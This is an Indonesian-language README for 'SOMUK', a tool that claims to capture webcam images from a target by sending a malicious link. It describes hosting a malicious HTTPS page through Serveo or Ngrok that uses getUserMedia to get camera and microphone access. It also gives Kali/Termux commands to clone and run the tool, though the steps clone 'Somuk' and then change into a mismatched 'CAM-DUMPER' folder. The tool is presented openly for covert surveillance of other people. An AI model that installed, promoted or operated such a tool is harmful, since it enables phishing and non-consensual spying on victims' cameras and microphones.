<h1 align="center">SOMUK</h1>
<p align="center"><img src="Somuk.jpg" max-width="90%%" height="auto"></p>
<p align="center">Ambil gambar webcam dari target hanya dengan mengirimkan tautan berbahaya</p>

**Bagaimana cara kerjanya?**

Alat ini menghasilkan halaman HTTPS berbahaya menggunakan metode Serveo atau Ngrok (port forwarding),  
dan menyisipkan kode JavaScript untuk memproses permintaan menggunakan `MediaDevices.getUserMedia()`.
`MediaDevices.getUserMedia()` meminta izin kepada pengguna untuk menggunakan perangkat media dan menghasilkan `MediaStream` 
yang berisi trek (tracks) untuk jenis media yang diminta. Aliran tersebut dapat mencakup:,

- trek video (kamera, screen share, virtual video source),
- trek audio (mikrofon, converter A/D, dsb),
- dan mungkin jenis trek lainnya.

Lihat selengkapnya tentang `MediaDevices.getUserMedia()` di sini:  
https://developer.mozilla.org/en-US/docs/Web/API/MediaDevices/getUserMedia

---

### Instalasi (Kali Linux / Termux)

Gunakan block code agar perintah terlihat rapi dan mudah di-copy:

```bash
$ apt update && apt upgrade
$ apt install git php wget curl jq
$ git clone https://github.com/Readone99/Somuk
$ cd CAM-DUMPER
$ chmod +x camdumper.sh
$ ./camdumper.sh
